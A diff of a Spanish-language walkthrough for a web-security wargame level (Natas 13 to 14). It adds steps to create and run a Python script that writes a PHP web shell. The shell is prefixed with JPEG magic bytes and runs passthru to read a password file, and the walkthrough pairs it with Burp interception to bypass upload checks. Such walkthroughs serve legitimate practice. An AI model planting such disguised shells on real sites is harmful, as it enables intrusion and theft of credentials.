@@ -102,6 +102,8 @@ Podemos utilizar un **Editor Hexadecimal** para cambiarle los primeros bytes o h
 
 El script en **Python** es bastante sencillo de hacer, por lo que lo hacemos así :smile:
 
+Le llamamos **phpShellPython.py** 
+
 ```python
 fichero = open('phpShell.php','w')  
 fichero.write('\xFF\xD8' + '<? passthru("cat /etc/natas_webpass/natas14"); ?>')  
@@ -114,7 +116,13 @@ fichero.close()
     - ```php <? passthru("cat /etc/natas_webpass/natas14"); ?> ``` 
 - 4 Cerramos el fichero
     
-Bueno ya tenemos el fichero preparado y ahora solo nos queda realizar las mismas acciones que en la prueba anterior. 
+Abrimos el editor **nano** y escribimos el código. A continuación lanzamos el script con el comando:
+
+```bash
+python phpShellPython.py
+```
+
+Bueno ya tenemos el fichero **phpShell.php** recién salido del horno y ahora solo nos queda realizar las mismas acciones que en la prueba anterior. 
 
 Configuramos el **Proxy** a **localhost:8080** en el navegador y arrancamos el **BURP** para interceptar el tráfico que enviamos y poder modificarlo posteriormente y saltarnos los controles de acceso.
 
